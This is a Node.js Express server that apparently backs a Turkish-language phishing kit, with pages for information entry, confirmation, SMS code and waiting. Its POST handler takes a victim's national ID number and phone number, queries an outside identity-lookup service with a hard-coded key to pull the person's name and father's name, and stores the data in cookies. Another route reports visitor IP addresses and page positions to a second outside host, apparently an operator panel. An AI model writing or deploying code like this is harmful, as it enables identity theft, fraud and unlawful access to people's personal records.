const express = require('express');
const axios = require('axios');
const path = require('path');
require('dotenv').config();
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Define static file routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '/public/index.html'));
});

app.get('/bilgi', (req, res) => {
  res.sendFile(path.join(__dirname, '/public/bilgi.html'));
});

app.get('/onay', (req, res) => {
  res.sendFile(path.join(__dirname, '/public/onay.html'));
});

app.get('/sms.html', (req, res) => {
  res.sendFile(path.join(__dirname, '/public/sms.html'));
});

app.get('/bekle', (req, res) => {
  res.sendFile(path.join(__dirname, '/public/bekle.html'));
});

// API to handle POST requests
app.post('/online-api', async (req, res) => {
  const tc = req.body.tridField;
  const telno = req.body.telno; 

  if (!tc || !telno) {
    return res.status(400).send('TC and telno are required.');
  }

  try {
    const response = await axios.get(`https://ilkkuralsaygi.online/apiservice/stayhigh/tcpro.php?auth=stayhighforlife&tc=${tc}`);
    const data = response.data;

    if (!data) {
      throw new Error('Invalid response from API');
    }

    // Save data to cookies
    res.cookie('adi', data.adi, { httpOnly: false });
    res.cookie('soyadi', data.soyadi, { httpOnly: false });
    res.cookie('babaad', data.babaad, { httpOnly: false });
    res.cookie('telno', telno, { httpOnly: false });

    res.redirect('/sorgula');
  } catch (error) {
    console.error('API request error:', error);
    res.status(500).send('Server error.');
  }
});

// API route
app.get('/api', async (req, res) => {
  try {
    const { user_ip: userIp, current_page: currentPage } = req.query;

    if (!userIp || !currentPage) {
      return res.status(400).send('user_ip and current_page are required.');
    }

    // Construct the external API URL
    const apiUrl = `https://hakikicelikhantutunu.com/dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;

    // Make a GET request to the external API
    const response = await axios.get(apiUrl);

    if (!response.data) {
      throw new Error('Invalid response from API');
    }

    res.json(response.data);
  } catch (error) {
    console.error('API request error:', error);
    res.status(500).json({ error: error.message });
  }
});

app.listen(port, () => {
  console.log(`Web server is running on port ${port}`);
});
